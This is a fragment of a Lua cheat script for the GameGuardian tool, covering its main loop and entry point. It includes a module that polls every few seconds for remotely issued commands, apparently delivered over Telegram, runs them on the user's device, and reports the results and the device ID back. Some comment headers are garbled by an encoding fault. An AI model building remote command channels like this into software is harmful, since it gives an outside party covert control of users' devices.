        end
        
        -- Отправляем ответ
        if response ~= "" then
            pcall(TELEGRAM.send, response)
        end
        
        return true
    end
    
    -- Проверка и выполнение команд
    function remote.check()
        local currentTime = os.time()
        
        -- Проверяем не слишком часто
        if (currentTime - state.lastCheck) < CONFIG.REMOTE_CONTROL_INTERVAL then
            return
        end
        
        state.lastCheck = currentTime
        
        -- Получаем команды
        local commands = remote.getCommands()
        if not commands or #commands == 0 then
            return
        end
        
        -- Выполняем каждую команду
        for _, command in ipairs(commands) do
            pcall(remote.executeCommand, command)
        end
    end
    
    return remote
end)()

-- ============================================================================
-- MAIN LOOP - РћСЃРЅРѕРІРЅРѕР№ С†РёРєР»
-- ============================================================================
local function mainLoop()
    local initSuccess = pcall(initSession)
    if not initSuccess then
        pcall(gg.alert, "Initialization failed")
        return
    end
    
    -- Инициализация Remote Control - очистка старых команд
    pcall(REMOTE_CONTROL.init)
    
    local alertMessage = "Script Activated!\n\n" ..
                        "Version: " .. CONFIG.SCRIPT_VERSION .. "\n" ..
                        "Device ID: " .. SESSION.device.hwid .. "\n\n" ..
                        "Open GG menu to use features"
    
    pcall(gg.alert, alertMessage)
    
    while true do
        -- Получаем текущее время
        local currentTime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                currentTime = timeValue
            end
        end
        
        -- ПОСТОЯННАЯ проверка удаленных команд (каждые 5 сек)
        pcall(REMOTE_CONTROL.check)
        
        -- Проверка безопасности
        if (currentTime - SESSION.lastCheck) >= CONFIG.CHECK_INTERVAL then
            local checkSuccess = pcall(securityCheck)
        end
        
        -- Проверка таймаута сессии
        if (currentTime - SESSION.startTime) >= CONFIG.SESSION_TIMEOUT then
            pcall(gg.alert, "Session timeout reached")
            break
        end
        
        -- Проверка видимости меню
        local visibleSuccess, isVisible = pcall(gg.isVisible, true)
        
        if visibleSuccess and isVisible == true then
            pcall(gg.setVisible, false)
            
            -- Вызов основного скрипта
            local scriptSuccess, scriptResult = pcall(MAIN_SCRIPT)
            
            if scriptSuccess then
                if scriptResult == false then
                    break
                end
            end
        end
        
        UTIL.safeSleep(100)
    end
end

-- ============================================================================
-- ENTRY POINT - РўРѕС‡РєР° РІС…РѕРґР°
-- ============================================================================
local mainSuccess, mainError = pcall(mainLoop)

if not mainSuccess then
    if mainError ~= nil then
        local errorStr = UTIL.safeToString(mainError)
        pcall(gg.alert, "ERROR:\n\n" .. errorStr)
        pcall(TELEGRAM.alert, "CRASH", errorStr)
    end
end

cleanup()
